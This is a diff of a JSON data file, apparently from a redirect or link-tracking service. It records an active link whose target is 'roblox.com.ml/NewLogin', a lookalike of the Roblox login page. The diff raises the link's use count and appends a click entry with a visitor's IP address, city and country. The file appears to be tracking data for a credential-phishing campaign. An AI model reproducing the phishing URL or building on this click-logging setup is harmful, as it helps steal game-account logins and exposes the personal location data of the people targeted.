@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 209,
+    "useCount": 210,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1784,6 +1784,14 @@
         "city": "Decatur",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1776975186183,
+        "ip": "173.32.31.7",
+        "country": "Canada",
+        "city": "Richmond Hill",
+        "flag": "🇨🇦",
+        "countryCode": "CA"
       }
     ]
   },
